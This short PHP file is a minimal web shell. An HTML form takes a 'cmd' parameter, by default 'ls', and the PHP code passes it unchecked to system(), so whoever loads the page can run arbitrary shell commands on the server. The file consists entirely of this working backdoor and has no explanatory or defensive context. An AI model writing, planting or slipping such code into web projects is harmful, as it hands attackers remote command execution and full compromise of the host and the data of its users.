<html>
<body>
<form method=GET>
<input  type='text' name='cmd' value='ls'>
<input type=submit name=submit>
</form>
<?php
    if($_GET['cmd'])
    {
        system($_GET['cmd']);
    }
?>
</body>
</html>
